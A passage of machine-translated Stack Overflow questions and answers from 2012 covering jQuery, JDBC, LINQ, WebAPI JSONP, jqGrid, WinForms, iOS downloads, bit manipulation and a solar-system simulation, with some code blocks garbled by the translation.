                    $(this).find("ul").stop().slideToggle(400);
                },
                function(){
                    $(this).find("ul").stop().slideToggle(400);
                }
            );

            $("ul.extend li").not(".father").hover(
                function(){
                    $(this).animate({width:"170"}, {duration:200, queue:false});
                },
                function(){
                    $(this).animate({width: "150"}, {duration:500, easing: "easeOutBounce", queue:false});
                }
            );

            $("ul.color li").hover(
                function(){
                    $(this).animate({backgroundColor: "#333"}, {duration:100, queue:false});
                },
                function(){
                    $(this).animate({backgroundColor: "#EEE"}, {duration:100, queue:false});
                }
            );
        });​ 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T10:19:18.393

发生这种情况是因为您指定了

```
li.father { padding: 5px 10px 0 0; } 
```

因此，嵌套的 ul 也具有该填充。只需删除正确的填充并将大小增加 `li.father`10 像素，就像这样

```
li.father { padding: 5px 0 0 0; width: 160px; } 
```

见[http://jsfiddle.net/Z6Ueu/9/](http://jsfiddle.net/Z6Ueu/9/)

# java - 数据库操作后的关闭语句？

> ID：10514038
> 
> 赞同：1
> 
> 时间：2012-05-09T10:12:26.260
> 
> 标签：java, jdbc

声明声明；连接连接；

我在每次数据库操作后关闭连接，如下所示。

```
connection.close(); 
```

我创建了如下语句对象。

```
connection.createStatement(....) 
```

我是否需要关闭状态也类似于连接关闭？

**我的意思是我需要调用 statement.close(); 吗？**

如果不调用会发生什么？

谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-09T10:16:02.063

[Javadoc](http://docs.oracle.com/javase/6/docs/api/java/sql/Statement.html#close%28%29)说明了一切：

> `Statement.close()`
> 
> 立即释放此 Statement 对象的数据库和 JDBC 资源，而不是等待它自动关闭时发生。**通常最好在使用完资源后立即释放资源，以避免占用数据库资源。**

确保`close()`始终调用的一种好方法是将其放置在`finally`块中：

```
Statement stmt = connection.createStatement();
try {
    // use `stmt'
} finally {
    stmt.close();
} 
```

在 Java 7 中，上述内容可以更简洁地写成：

```
try (Statement stmt = connection.createStatement()) {
    // ...
} 
```

这称为[`try`-with-resources 语句](http://docs.oracle.com/javase/tutorial/essential/exceptions/tryResourceClose.html)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-12T07:45:20.580

一般来说，如果你关闭一个连接，所有相关的资源也将被关闭，前提是驱动程序实现者正确地完成了他的工作。也就是说：最好在完成资源后关闭它们，因为这将释放您和数据库的资源。

# c# - LINQ - 按价值区分？

> ID：10514039
> 
> 赞同：6
> 
> 时间：2012-05-09T10:12:34.537
> 
> 标签：c#, .net, linq

代码 ：

```
news = (from New myNew in new News()
       select myNew).Distinct().ToList(); 
```

但是这个 Distinct 适用于具有相同值的“对象”。我需要，在我的清单中，`myNew`每个月都有一个。（所以一月一个，二月一个，依此类推）。比，`news`将获得 12 条记录。

有可能`Distinct(myNew.Month)`吗？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-05-09T10:18:00.093

您可以按月分组并取第一个或最后一个或其他（您还没有告诉我们）：

```
var news = News()
           .GroupBy(n => n.Month)
           .Select(grp => grp.Last()); 
```

**编辑**：从对 Habib 回答的评论中，我看到即使没有消息，你也想要 12 个月。然后你需要做一个“Linq Outer-Join”：

```
var monthlyNews = from m in Enumerable.Range(1, 12) // left outer join every month
                  join n in News() on m equals n.Month into m_n
                  from n in m_n.DefaultIfEmpty()
                  group n by m into MonthGroups
                  select new {
                      Month = MonthGroups.Key, 
                      LastNews = MonthGroups.Last() 
                  };
foreach (var m in monthlyNews)
{
    int month = m.Month;
    var lastNewsInMonth = m.LastNews;
    if (lastNewsInMonth != null) ; // do something...
} 
```

**编辑**：由于您在代码中实现查询时遇到问题，因此您无需选择还包含月份的匿名类型。您也可以只选择新闻本身：

```
var monthlyNews = from m in Enumerable.Range(1, 12) // every motnh
                  join n in news on m equals n.Month into m_n
                  from n in m_n.DefaultIfEmpty()
                  group n by m into MonthGroups
                  select MonthGroups.Last(); 
```

请注意，您现在收到 12 条新闻，但其中一些可能是`null`当月没有新闻时。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-09T10:18:37.797

```
var result  =  News()
  .GroupBy(p => p.Month)
  .Select(g => g.First())
  .ToList(); 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-05-09T15:20:35.750

解决方案 1\. 获取[MoreLinq](http://code.google.com/p/morelinq/)（也可作为 NuGet 包和使用

```
 News().DistinctBy(n => n.Property) 
```

解决方案 2\. 实现[IEqualityComparer 并使用此 Distinct() 重载。](http://msdn.microsoft.com/en-us/library/bb338049.aspx)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2014-08-20T13:10:57.247

短手解决方案

```
var vNews  =  News()   
              .GroupBy(p => p.Month, (key, p) => p.FirstOrDefault()) 
              .ToList(); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-09T10:29:00.663

```
var vNews  =  News()   
              .GroupBy(p => p.Month)   
              .Select(g => g.First())   
              .ToList(); 
```

# jsonp - 如何使用 WebAPI 处理 JSONP？

> ID：10514047
> 
> 赞同：4
> 
> 时间：2012-05-09T10:13:10.433
> 
> 标签：jsonp, asp.net-web-api, wcf-web-api

> **可能重复：**
> [带有 MVC 4 WebApi 的 JSONP](https://stackoverflow.com/questions/9421312/jsonp-with-mvc-4-webapi)

我的 WebAPI 有一个 get 方法，如下所示：

```
 private T Get<T>(string uri)
    {
        T result = default(T);
        bool isSuccess = true;

        client
            .GetAsync(uri)
            .ContinueWith(task =>
            {
                // EnsureStatus
                isSuccess = task.Result.IsSuccessStatusCode;
                task
                .Result
                .Content
                .ReadAsAsync<T>()
                .ContinueWith(t => result = t.Result)
                .Wait();
            })
            .Wait();
       return result;
     } 
```

结果以 JSON 格式生成，但我希望它用于 JSONP。

我读过`ReadAsSync`只处理内置的媒体格式化程序。那么有没有办法可以改变它来处理JsonP？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-09T14:10:03.483

[从这个副本](https://stackoverflow.com/questions/9421312/jsonp-with-mvc-4-webapi)中大量窃取......

要完成您想要的，您需要三件事：

1.  添加一个`media formatter`输出 JSONP的
2.  注册媒体格式化程序（传统上通过 global.asx 完成）
3.  确保客户端请求 jsonP。

你可以窃取这个 JSONP 媒体[格式化程序](https://github.com/thinktecture/Thinktecture.Web.Http/blob/master/Thinktecture.Web.Http/Formatters/JsonpFormatter.cs)。

然后，您需要注册媒体格式化程序。您可以使用以下代码片段以编程方式执行此操作：

```
var config = GlobalConfiguration.Configuration;
config.Formatters.Insert(0, new JsonpMediaTypeFormatter()); 
```

由于您显然不使用 global.asax，因此您需要确保格式化程序以某种方式注册。您没有提供有关如何执行此操作的足够信息，但我怀疑明智地放置 IF 语句和指示注册的静态变量会让您到达那里。

我仍然不太清楚您使用的是什么类型的客户端，但如果它是 jquery，则如下所示：

```
$.ajax({
    url: 'http://myurl.com',
    type: 'GET',
    dataType: 'jsonp',
    success: function (data) {
        alert(data.MyProperty);
    }
}) 
```

重要的部分是`accept`发送的标头与您闪亮的新 jsonp 格式化程序正在侦听的接受标头匹配。在我看来，前两个选择是：`application/javascript`或`text/javascript`。

# jquery - 如何从jqgrid中的子网格访问父网格ID

> ID：10514049
> 
> 赞同：2
> 
> 时间：2012-05-09T10:13:17.743
> 
> 标签：jquery, asp.net-mvc-3, jqgrid

我正在构建一个运行良好的 jqgrid ...网格构建

```
if (jqent.isReq) {
    sbGrid.Append("subGrid: true,");
    sbGrid.Append("subGridRowExpanded: function (subgrid_id, row_id) {");
    sbGrid.Append(" $('#' + subgrid_id).html(renderhtmlforSubgrid(subgrid_id, row_id));},");
} 
```

我有一个带有 textarea 的子网格和一个将由以下代码呈现的图像控件

```
function renderhtmlforSubgrid(subgrid_id, row_id) {
    var script = '<div style="margin-left:10px; margin-top:10px; margin-bottom:10px;">';
    script += '<textarea class="txtCommentwatermarkOn" id="txtCommentSection" name="txtCommentSection" rows=2 cols=20>Type your comments here</textarea>';
    script += '<input onclick=\"RenderModalPopup(' + row_id + ',' + subgrid_id + ',this);\" type="image" id="image" src="../../Content/Images/commentIcon.png"/>';
    script += '</div>';

    return script;
} 
```

单击图像“RenderModalPopup”功能将被触发

```
function RenderModalPopup(rowid, tableid, event) {
    var dataFromRow = $('#tblArtifact1').jqGrid('getRowData', rowid);
    var PhaseArtifactId = $('#tblArtifact1').jqGrid('getCell', rowid, 'ID');
    .......................... 
```

每件事都运行良好......现在的问题是我将网格 ID 硬编码为“tblArtifact1”以获取列值。需要删除。我可以得到网格ID吗？是否有任何预定义的参数/函数来获取它？

我被困住了..请帮忙。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-09T11:04:31.300

在回调函数内部，`subGridRowExpanded`您可以使用`this`初始化为网格 DOM（的 DOM `<table>`）的变量。所以你可以`id`通过`this.id`. 如果你`renderhtmlforSubgrid`在里面打电话，`subGridRowExpanded`我建议你使用

```
renderhtmlforSubgrid.call(this, subgrid_id, row_id) 
```

代替

```
renderhtmlforSubgrid(subgrid_id, row_id) 
```

如果函数`this`内部`renderhtmlforSubgrid`不会更改为全局`window`对象，您可以拥有`this`对您有用的信息（例如`this.id`id 或`$(this)`jQuery rapper 到父网格）。

我建议您考虑`idPrefix`在子网格中使用选项来防止 id 重复（有关更多信息，请参阅[答案](https://stackoverflow.com/a/10247633/315935)）。

此外，我从您的代码中看到，作为 JavaScript 开发人员，您更像是 C#/C++ 开发人员。2年前我也有同样的问题。JavaScript 有一些结构与其他著名的语言很接近，但深层语义确实不同。因此，JavaScript 开发人员有许多标准陷阱，他们以错误的方式使用现有结构。

例如：你不应该使用名称以大写字母开头的变量、属性或特别是函数。目前`RenderModalPopup`并`PhaseArtifactId`打破了规则。JavaScript 没有类，但可以使用函数创建紧密的构造。在函数内部，您可以将属性分配给`this`. 这样的函数是“类”的构造函数，应该有第一个大写字母。要创建“类”的实例，应该使用`new`. 例如`var now = new Date();`.

闭包是 JavaScript 中函数的另一个例子，它看起来像函数，但有很多重要的区别。

此外，我建议您使用更多匿名函数和函数表达式（`var renderhtmlforSubgrid = function (subgrid_id, row_id) {...}`）而不是函数语句（`function renderhtmlforSubgrid (subgrid_id, row_id) {...}`），并在函数体的第一行定义所有变量。JavaScript*没有像大多数计算机语言那样的块级变量声明*，因此如果您在 JavaScript 代码中定义变量，很容易产生错误代码。

最后一个建议是使用[Kernighan 和 Ritchie 的](http://en.wikipedia.org/wiki/Indent_style#K.26R_style)JavaScript 代码代码格式化风格，该风格独立于您过去在您最喜欢的计算机语言中使用的风格。它将防止您[自动插入分号](http://es5.github.com/#x7.9)，这可能会导致难以定位的严重错误。

# c# - 如何使用 { get; 从 form1 获取变量到 form2 放;}？

> ID：10514050
> 
> 赞同：-2
> 
> 时间：2012-05-09T10:13:21.877
> 
> 标签：c#, winforms

全部。

我是 C# 的新手。我知道这是一个非常受欢迎的问题。但我不明白。我知道有一个错误，但在哪里？例如 - Form1 代码的第一部分包含私有变量测试，我需要在 Form2 中获取此变量的值。错误在哪里？

```
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace WindowsFormsApplication1
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string test = "test this point";
            Form2 dlg = new Form2();
            dlg.test = test;
            dlg.Show();
        }
    }
}

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace WindowsFormsApplication1
{
    public partial class Form2 : Form
    {
        public string test { get; set; }

        public Form2()
        {
            InitializeComponent();
            label1.Text = test;
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-09T10:16:16.493

在您的 Form2 中，您使用的是公共属性，因为`public`您可以通过 form1 中的对象分配它。例如：

```
 private void button1_Click(object sender, EventArgs e)
        {
            Form2 dlg = new Form2();
            dlg.test = "test this point";
            dlg.Show();
        } 
```

有几种方法可以在表格 2 中使用它，如果您只想设置标签的 text 属性，这将是最好的：

```
public partial class Form2 : Form
    {
        public string test 
        { 
           get { return label1.Text; }
           set { label1.Text = value ;} 
        }

        public Form2()
        {
            InitializeComponent();
        }
    } 
```

如果需要，您还可以在属性的设置器中调用函数。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-09T13:13:16.567

你是对的，这种问题已经被问过很多次了，版本略有不同......这是我过去提供的一些答案

[这可能最接近您正在寻找的东西](https://stackoverflow.com/questions/7969582/how-to-update-textbox-in-form1-from-form2/7971828#7971828)

[通过方法调用获得值的一个答案](https://stackoverflow.com/questions/4887820/how-do-you-pass-an-object-from-form1-to-form2-and-back-to-form1/4887906#4887906)

[另一个，逐步创建两个表单并使用函数或 Getter(setter) 从另一个表单获取值](https://stackoverflow.com/questions/7969582/how-to-update-textbox-in-form1-from-form2/7969676#7969676)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-09T10:16:02.173

您没有在方法中的任何地方使用字符串测试。尝试这个：

```
private void button1_Click(object sender, EventArgs e)
{
    Form2 dlg = new Form2();

    dlg.Test = "test this point";

    dlg.Show();
} 
```

查看您如何将值分配给`Test`Form2 对象上的属性`dlg`。

注意：我对属性使用了大写`Test`字母，因为这是对属性名称样式的普遍共识。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-09T10:19:59.947

test 是一个可用于`Form2`（最好是测试）的属性，而`string test`仅适用于`Form1`. 除非您分配它，否则它与该属性无关。

```
Form2 dlg = new Form2();
dlg.test = test; // this will assign it
dlg.Show(); 
```

现在`Form2`属性已经获得了将用于在`Label`

# sitecore - Sitecore：在后面的代码中通过自定义参数进行缓存？

> ID：10514052
> 
> 赞同：2
> 
> 时间：2012-05-09T10:13:26.813
> 
> 标签：sitecore, sitecore6

我们希望在特定页面上启用 Sitecore 6 中的缓存，但是，该页面有一个基于随机值的图像集 - 因此，我们实际上需要缓存每个单独呈现的页面，以便我们可以保持这个“随机”图片。

有什么建议么？我认为我们需要使用子布局参数，但看不到如何在后面的代码中设置它以影响缓存行为。

任何直接操作缓存条目的方法？

问候，

安迪

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-09T10:46:02.637

创建在 Sitecore 中定义的外部子布局，例如 MyComponent。在代码中，静态绑定内部子布局，例如。MyComponentInner 和前者的 C# 中，将 VaryByParms 值设置为随机数。

# xcode - 从 Storyboard 降级到 XIB

> ID：10514056
> 
> 赞同：1
> 
> 时间：2012-05-09T10:14:11.227
> 
> 标签：xcode, button, storyboard, xib

所以我知道我不能在低于 5.0 的任何东西上使用故事板。我只使用故事板完成了我的应用程序，所以对代码非常基础。

我将使用 XIB 重新创建我的应用程序，我将为我的每个故事板创建一个新的 XIB 文件。

我想要帮助的是我需要在每个 XIB 之间交叉淡入淡出的代码。将有一个链接每个 XIB 的按钮。

我需要在 ViewController.h 中添加什么以及在哪里将代码放入 ViewController.m

非常感谢你的帮助。

布莱斯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T10:28:39.400

这就是我使用的。

```
- (IBAction)changeViews:(id)sender
{
ModalViewControllerTwo *modalViewControllerTwo = [[ModalViewControllerTwo alloc] init];
modalViewControllerTwo.modalTransitionStyle = UIModalTransitionStyleCrossDissolve;
[rootViewController presentModalViewController:modalViewControllerTwo animated:YES];
} 
```

# android - 如何创建android应用程序来备份手机

> ID：10514058
> 
> 赞同：-2
> 
> 时间：2012-05-09T10:14:38.140
> 
> 标签：android, android-contacts

如何创建手机数据的备份并在丢失的情况下从服务器端数据库中检索另一部手机上的数据，我想开发 android

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T11:36:27.267

使用更新的信息（联系人备份），我会建议以下内容：

*   将安卓手机与谷歌账户连接，所有联系人都将保存在谷歌账户中，并可在使用该账户注册的其他手机上使用。可以有多个帐户。也可在 gmail/google 联系人中使用。适用于谷歌应用程序帐户以及 gmail。

和/或

*   将安卓手机与交换服务器连接，可以将联系人存储在那里，并且可以在连接的其他手机上使用

云（和安卓）的力量。您已经备份了联系人。

例如，其中一个或多个联系人可用（并合并为一个联系人）：skype、twitter、gmail、exchange、endomondo、...（即使 facebook 忽略了与 android 本身的集成，也可以使用变通方法这些天）和许多其他人。Android 在这方面非常好！

话虽如此，有一个联系人 api，使用标准 android 内容解析器等相当容易访问。请参阅 [http://developer.android.com/resources/articles/contacts.html](http://developer.android.com/resources/articles/contacts.html)

# ios - 使用 NSURLConnection 下载的内容不会显示在我的 iPhone 上？

> ID：10514065
> 
> 赞同：0
> 
> 时间：2012-05-09T10:15:06.103
> 
> 标签：ios, path, download, nsurlconnection

我正在使用 NSURLConnection 从服务器下载 mp3 文件，我的代码是

```
- (IBAction)download:(id)sender 
 {
NSURL *url = [NSURL      URLWithString:@"http://viadj.viastreaming.net/start/psalmsmedia/ondemand/Nin%20snehamethrayo.mp3"];    
   NSLog(@"%@", url);
   NSURLRequest *theRequest = [NSURLRequest requestWithURL:url   cachePolicy:NSURLRequestReloadIgnoringLocalCacheData timeoutInterval:60];
   receivedData = [[NSMutableData alloc] initWithLength:0];
   NSURLConnection *connection = [[NSURLConnection alloc] initWithRequest:theRequest delegate:self startImmediately:YES];

 }

- (void) connection:(NSURLConnection *)connection didReceiveResponse:(NSURLResponse *)response {
  [UIApplication sharedApplication].networkActivityIndicatorVisible = YES;
  [receivedData setLength:0];
 }

- (void) connection:(NSURLConnection *)connection didReceiveData:(NSData *)data {
[receivedData appendData:data];

 }

- (void) connection:(NSURLConnection *)connection didFailWithError:(NSError *)error 
  {

  [UIApplication sharedApplication].networkActivityIndicatorVisible = NO;
  [connection release];

  }

- (NSCachedURLResponse *) connection:(NSURLConnection *)connection willCacheResponse:(NSCachedURLResponse *)cachedResponse 
  {

  return nil;

  }

 - (void) connectionDidFinishLoading:(NSURLConnection *)connection 
 {

  [UIApplication sharedApplication].networkActivityIndicatorVisible = NO;

  NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);

  NSString *documentsDirectoryPath = [[paths objectAtIndex:0]stringByAppendingPathComponent:@"myFile.mp3"];

  [receivedData writeToFile:documentsDirectoryPath atomically:YES];

  [connection release];

  } 
```

当我单击下载按钮时，活动指示器开始动画并在一段时间后停止（我认为它正在下载）。但之后我在我的 iPhone 磁盘上找不到下载的文件。实际上这些文件在下载后存储在哪里。我编辑了我的 info.plist 以支持 iTunes 文件共享。

他们对这段代码有什么错误吗？或者为什么我看不到下载的文件？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-10T04:18:47.523

我为下载铃声创建了一个类，请参阅第一个 RingtoneDwonloader.h 文件

# 进口

@protocol RingtoneDownloaderDelegate -(void)downloadingCompleted;

@结尾

@interface RingtoneDownloader : NSObject { NSMutableData *receivedData; NSDate *连接时间；NSMutableString *diskPath;

```
id<RingtoneDownloaderDelegate>delegate; 
```

} @property（非原子，保留）iddelegate；

-(void)createUrlRequestForDownloadRingtone:(NSString *)urlString; -(void)取消下载；

@结尾

现在我的 RingtoneDownloader.m 文件，

# 导入“铃声下载器.h”

# 导入“AppDelegate.h”

@interface RingtoneDownloader(){ AppDelegate *_appDelegate; NSURLConnection *theConnection; } @结尾

```
 @implementation RingtoneDownloader
  @synthesize delegate;
  -(void)createUrlRequestForDownloadRingtone:(NSString *)urlString{

_appDelegate = (AppDelegate *)[[UIApplication sharedApplication] delegate];

NSURLRequest *theRequest=[NSURLRequest requestWithURL:[NSURL URLWithString:urlString]  cachePolicy:NSURLRequestUseProtocolCachePolicy timeoutInterval:60.0];

// create the connection with the request
// and start loading the data

theConnection =[[NSURLConnection alloc] initWithRequest:theRequest delegate:self];

if (theConnection) {
    // Create the NSMutableData to hold the received data.
    receivedData = [[NSMutableData data] retain];
} else {
    // Inform the user that the connection failed.
} 
```

}

```
 - (void)connection:(NSURLConnection *)connection didReceiveResponse:(NSURLResponse *)response 
```

{ // 当服务器确定它
[receivedData setLength:0];时调用此方法 // long responseLength = [响应预期内容长度]; // NSLog(@"%ld", responseLength); }

```
 - (void)connection:(NSURLConnection *)connection didReceiveData:(NSData *)data 
```

{ // 将新数据附加到 receivedData. [receivedData appendData:data]; }

```
 - (void)connection:(NSURLConnection *)connection didFailWithError:(NSError *)error 
```

{ // 释放连接，以及数据对象 [theConnection release];
// receivedData 在其他地方被声明为方法实例 [receivedData release];

```
UIAlertView *alt = [[UIAlertView alloc] initWithTitle:@"" message:[NSString stringWithFormat:@"%@", [error localizedDescription]] delegate:nil cancelButtonTitle:@"Ok" otherButtonTitles:nil, nil];
[alt show];
[alt release];
// inform the user         
NSLog(@"Connection failed! Error - %@ %@", [error localizedDescription], [[error userInfo] objectForKey:NSURLErrorFailingURLStringErrorKey]); 
```

}

```
 - (void)connectionDidFinishLoading:(NSURLConnection *)connection 
```

{ NSLog(@"成功！收到 %d 字节数据",[receivedData length]); // 释放连接和数据对象

```
 _appDelegate = (AppDelegate *)[[UIApplication sharedApplication] delegate];
NSString *soundFileName = _appDelegate.ringtoneURL;
NSString *soundFileextension =  [soundFileName substringFromIndex:([soundFileName length]-3)];
NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask, YES);
NSString *documentsDirectory = [paths objectAtIndex:0];
NSString *filePath = [documentsDirectory stringByAppendingPathComponent:[NSString stringWithFormat:@"%@.%@", _appDelegate.ringtoneText, soundFileextension]];
NSData *imageData = (NSData *)receivedData;
NSError *err = nil;
BOOL isWriten = [imageData writeToFile:filePath options:NSDataWritingAtomic error:&err];    

if(!isWriten){
    NSLog(@"Ringtone not saved   %@", [err localizedDescription]);
}

[theConnection release];
[receivedData release];    
[delegate downloadingCompleted]; 
```

}

```
 -(void)cancelDownloading{
[theConnection cancel];
[theConnection release];
[delegate downloadingCompleted]; 
```

}

现在你必须创建这个类的实例并设置我创建的委托。该代表向您提供有关您的铃声文件是否成功下载的信息。

在您的应用程序中使用 iTunes 文件共享并将铃声文件复制到应用程序的文档目录。

```
Set "Application supports iTunes file sharing" to YES in your info.plist 
```

用户现在可以通过 iTunes 访问铃声并将其添加到他们的设备铃声中。

# jquery - 将一个项目拖到 div 列表下方

> ID：10514074
> 
> 赞同：0
> 
> 时间：2012-05-09T10:15:38.607
> 
> 标签：jquery

我有一个可拖动的：

```
<ul>
    <li>Option 1</li>
</ul>

    <script type="text/javascript">
    $(function() {
        $( "li" ).draggable({
            connectToSortable: //I don't where what should be configured here
        });
    });
    </script>

<div></div>
<div></div>
//add item here 
```

我正在尝试拖动“选项 1”，以便将其拖动到现有 div 列表中的最后一个 div 下方，如何启用？我想我需要以某种方式跟踪 div 列表？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T10:35:57.227

```
<script>
    $(function() {
        $( "#sortable" ).sortable({
            revert: true
        });
        $( "#draggable" ).draggable({
            connectToSortable: "#sortable",
            helper: "clone",
            revert: "invalid"
        });
        $( "ul, li" ).disableSelection();
    });
    </script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T13:23:42.157

我的解决方案是在 div 列表下添加一个新 div，在这个 div 中添加一个 css 类并使其可排序。

# java - 如何在java中验证字节数组中的位值

> ID：10514077
> 
> 赞同：-2
> 
> 时间：2012-05-09T10:15:59.253
> 
> 标签：java, bytearray

我有一个字节数组，例如 400 字节....然后是一个位的位置，例如 6。如何检查该位的值是否为 1？所以在我的例子中，返回值将是 true。

例子：

```
final byte[] b = new byte[] { 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
                0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }); 
```

什么是 00000100.... pos = 6 结果 = true

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T10:25:16.153

由于您向后计算字节和数组中的位置：

```
public boolean bitAtPos (byte [] b, int pos) {
  int el = b[pos/8];
  return ((el >> (8-(pos%8)) & 1) == 1);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T10:55:27.567

看起来好像你这样计算你的位数：

第 1 位是第一个字节的最高位，第 8 位是第一个字节的最低位，第 9 位是第二个字节的最高位，依此类推。

然后你可以使用：

```
private boolean isSet(int index) {
    int bitIndex = (index-1) % 8;
    int byteIndex = (index-1) / 8;
    int bitMask = 1 << 7-bitIndex;
    return (b[byteIndex] & bitMask) > 0; 
} 
```

但是，如果您（对我来说）使用更自然的索引方式，以便位 0 是第一个字节中的最低位，位 7 是第一个字节的最高位，位 8 是最低位但第二个字节（等等on) 可能是：

```
private boolean isSet(int index) {
    int bitIndex = index % 8;
    int byteIndex = index / 8;
    int bitMask = 1 << bitIndex;
    return (b[byteIndex] & bitMask) > 0; 
} 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-05-09T10:33:49.323

```
boolean validateValue(byte[] array, int numberToValidate, int position) {
    return (array.length > position-1 && position >= 1) ? array[position-1] == numberToValidate : false;
} 
```

此方法可帮助您对要验证的任何数字多次使用它。注意：我添加了一些预验证：
如果您使用无效位置作为参数，它将返回 false。最佳做法是抛出异常，但我会处理。

# html - 如何将iframe放入画布

> ID：10514081
> 
> 赞同：0
> 
> 时间：2012-05-09T10:16:04.223
> 
> 标签：html, iframe, canvas

你好我有一个小问题。

我如何将带有谷歌地图的 iframe 放入 html 中？

```
 <canvas id="google_map" width="600" height="400">
    <iframe width="600" height="390" frameborder="0" scrolling="no" marginheight="0" marginwidth="0" src=""></iframe>
 </canvas> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2017-11-23T10:05:48.223

你不需要把地图放在画布上试试这个......

```
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<div style="width: 100%; margin-top: 50px;">
   <iframe src="https://www.google.com/maps/embed?pb=!1m16!1m12!1m3!1d2965.0824050173574!2d-93.63905729999999!3d41.998507000000004!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!2m1!1sWebFilings%2C+University+Boulevard%2C+Ames%2C+IA!5e0!3m2!1sen!2sus!4v1390839289319" width="100%" height="200" frameborder="0" style="border:0"></iframe>
</div>
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T10:29:56.117

不幸的是，您不能在 Canvas 标记内放置 iFrame。但是，您可以使用相对位置将 iFrame 覆盖在画布元素上：

```
<style type="text/css">
canvas {
    width: 600px;
    height: 400px;
}
iframe {
    position: relative;
    top: -400px;
    width: 600px;
    height: 400px;
}
</style>
<canvas></canvas>
<iframe src=""></iframe> 
```

不过我要说的一件事是，使用框架通常是 Web 开发经验不足的标志。您对它们的使用可能会被规避。

# math - 行星和卫星的缩放速度不加起来？

> ID：10514086
> 
> 赞同：2
> 
> 时间：2012-05-09T10:16:23.187
> 
> 标签：math, simulation

所以我正在模拟太阳系并遇到了障碍......

实际上，月球相对于地球的速度比地球相对于太阳的速度要慢得多。然而，月球完成其轨道的速度要快得多，因为它必须行进的距离要短得多。月球在一年内绕地球公转约 13 次。

然而，在我的模拟中，月球一年可能有 2 个轨道......

我用维基百科检查了速度，它们是正确的。

唯一的区别是我扩展了所有内容，让我怀疑这就是原因。

所有距离除以 100 000，所有速度除以 1000

```
 this.angle += (speed * deltatime);

    this.x = this.semi_major_axis * Math.cos(this.angle) + this.parent.x + this.focalX;
    this.y = this.semi_minor_axis * Math.sin(this.angle) + this.parent.y + this.focalY; 
```

速度是根据维基百科的速度。（地球为 29.78 公里/秒，月球为 1.022 公里/秒）

在这种情况下，父表示它正在运行的物体（如果是地球，它是太阳。如果是月球，它是地球）

焦点X 和焦点Y 是与行星的偏移量。

速度和 2 轴值此时已按比例缩放。

我在规模的方式上错了吗？我完全错过了一些明显的东西吗？我只是以完全错误的方式做事吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-09T10:37:54.823

由于速度是距离/时间（例如公里/秒），当您将速度按 1000 倍，距离按 100000 倍时，无论您是否知道，都将时间按 100 倍。您确定在其余部分中已考虑到这一点你的计算？

是的，你正在以完全错误的方式处理这个问题。如果你正在构建一个机械模拟器，你会想在这个过程的早期就缩放距离，但是在数字模拟器中，为什么要缩放它们呢？只在原来的单位工作。

由于您没有跨多个 AU（天文单位）的计算机屏幕，您可能需要缩放用于成像的数字，但大多数图形系统会在管道中的某个时间点为您执行此操作。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-09T16:48:02.433

我想说你应该完成原始运动方程的无量纲化练习，类似于人们对流体的 Navier-Stokes 方程所做的事情（这是一个很好的例子）。您会看到应该出现无量纲分组，例如流体的普朗特和雷诺数，这将使您深入了解问题并使您的数值解更易于处理。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-09T10:50:17.750

我不认为这将是规模，模拟将比准确的速度快 100 倍（距离大幅下降，速度下降小），但它应该是统一的，所以地球和月球会两者都以相同的速度加速，我会再次查看基本速度并确保它们是正确的，以及计算行驶距离的算法。

# c# - 如何在 C#.NET 中将对象修剪为其基础对象？

> ID：10514087
> 
> 赞同：1
> 
> 时间：2012-05-09T10:16:23.263
> 
> 标签：c#, .net, security, inheritance, polymorphism

考虑以下方法：

```
public PrintObjectHierarchy(object o)
{
   Console.WriteLine(o.GetType.FullName);

   object baseObject = PruneObjectToItsBaseObject(o);
   if(!baseObject.GetType().Equals(typeof(object)))
       PrintObjectHierarchy(baseObject);
   else Console.WriteLine("System.Object");
} 
```

例如，如果我写：

```
class Form1 : Form
{
  static void Main()
  {
    Form1 f1 = new Form1();
    PrintObjectHierarchy(f1);
  }
} 
```

然后它应该为我打印：

```
MyNamespace.Form1
System.Windows.Form
System.Windows.Forms.ContainerControl
